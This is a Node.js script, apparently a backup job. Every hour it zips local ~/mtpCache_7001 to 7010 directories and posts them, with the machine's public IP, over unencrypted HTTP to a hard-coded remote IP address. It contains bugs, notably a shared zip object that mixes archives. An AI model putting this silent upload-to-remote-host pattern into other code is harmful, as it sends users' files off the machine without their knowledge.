const fs = require("fs");
const os = require("os");
const path = require('path');
const JSZIP = require("jszip");
const zip = new JSZIP();
const rimraf = require('rimraf');
const mkdirp = require('mkdirp')
const axios = require('axios');
const FormData =require('form-data');

const home_dir=path.join(os.homedir())
const home_backup_dir=home_dir+'/mtpCache_Backup'
const zip_commands=[]
const upload_commands=[]
let myIp=''
function startCommand(){
    axios('http://ip-api.com/json/').then(res=>{
        myIp=res.data.query
        init_dir()
    })
    setTimeout(()=>{
        startCommand()
    },60*60*1000)
}
// setInterval(()=>{
    startCommand()
// },1*60*60*1000)

function init_dir(){
    rimraf(home_backup_dir,(err)=>{
        if(err){
            console.log(err)
        }
        mkdirp(home_backup_dir).then(made =>{
            let _sum=0
            for(let i =7001;i<=7010;i++){
                let homedir_zone = home_dir+'/mtpCache_'+i;
                fs.stat(homedir_zone,function(err,stats){
                    _sum++
                    if(err){

                    }else{
                        zip_commands.push({file_path:homedir_zone,file_name:i+'.zip'})
                    }
                    if(_sum==10){
                        startZIP()
                    }
                })
            }
        })
    })
}

//读取目录及文件
function readDir(obj, nowPath) {
    let files = fs.readdirSync(nowPath);//读取目录中的所有文件及文件夹（同步操作）
    files.forEach(function (fileName, index) {//遍历检测目录中的文件
        let fillPath = nowPath + "/" + fileName;
        let file = fs.statSync(fillPath);//获取一个文件的属性
        if (file.isDirectory()) {//如果是目录的话，继续查询
            let dirlist = zip.folder(fileName);//压缩对象中生成该目录
            readDir(dirlist, fillPath);//重新检索目录文件
        } else {
            obj.file(fileName, fs.readFileSync(fillPath));//压缩目录添加文件
            // 可以直接上传数据
        }
    });
}

//开始压缩文件
function startZIP() {
    const _target=zip_commands.shift()
    console.log('startZIP:',_target.file_name)
    readDir(zip, _target.file_path);
    zip.generateAsync({//设置压缩格式，开始打包
        type: "nodebuffer",//nodejs用
        compression: "DEFLATE",//压缩算法
        compressionOptions: {//压缩级别
            level: 9
        }
    }).then(function (content) {
        fs.writeFileSync(path.join(os.homedir(), `/mtpCache_Backup/${_target.file_name}`), content, "utf-8");//将打包的内容写入 当前目录下的 result.zip中
        console.log('压缩完毕:',_target.file_name)
        upload_commands.push({
            file_name:_target.file_name,
            file_path:path.join(os.homedir(), `/mtpCache_Backup/${_target.file_name}`)
        })
        if(zip_commands.length>0){
            startZIP()
        }else if(zip_commands.length==0){
            upload()
        }
    });
}

function upload(){
    const _target=upload_commands.shift()
    var localFile = fs.createReadStream(_target.file_path);
    
    var formData = new FormData();
    formData.append('key',_target.file_name);
    formData.append('ip',myIp);
    formData.append('uploadFile',localFile);
    
    var headers = formData.getHeaders();//获取headers
    //获取form-data长度
    formData.getLength(async function(err, length){
    if (err) {
        return  ;
    }
    //设置长度，important!!!
    headers['content-length']=length;
    
    await axios.post('http://206.119.90.170:10086/singleUpload',formData,{headers}).then(res=>{                    
        console.log("上传成功",res.data);
    }).catch(err=>{
            console.log(JSON.stringify(err));
    }).finally(()=>{
        if(upload_commands.length>0){
            upload()
        }
    })
    
    })
}